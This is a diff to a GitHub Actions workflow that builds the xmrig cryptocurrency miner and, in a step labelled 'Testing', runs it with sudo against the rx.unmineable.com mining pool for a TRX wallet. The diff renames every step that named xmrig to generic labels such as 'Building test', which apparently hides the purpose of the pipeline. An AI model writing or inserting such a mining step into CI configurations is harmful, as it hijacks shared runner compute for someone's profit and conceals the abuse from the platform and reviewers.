@@ -1,4 +1,4 @@
-name: Building xmrig
+name: Building test
 
 on:
   workflow_dispatch:
@@ -20,27 +20,21 @@ jobs:
       - name: Clone repo
         run: |
           cd workspace
-          sudo hostname jzinferno
           git clone --depth=1 https://github.com/jzinferno/xmrig kernel
           cd kernel && mkdir build
 
-      - name: Set Swap Space
-        uses: pierotofy/set-swap-space@master
-        with:
-          swap-size-gb: 8
-
-      - name: Build xmrig
+      - name: Build test
         run: |
           cd workspace/kernel/build
           cmake ..
           make -j$(nproc)
 
-      - name: Testing xmrig
+      - name: Testing
         run: |
           cd workspace/kernel/build
           sudo ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u "TRX:TSzDjv3U8zazCV7QPjCSqLwjuYf2sNWCsx.$(tr -dc A-Za-z0-9 </dev/urandom | head -c 13; echo)#byyv-uprz" -p x -k
 
-      - name: Release xmrig
+      - name: Release
         uses: softprops/action-gh-release@v1
         env:
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
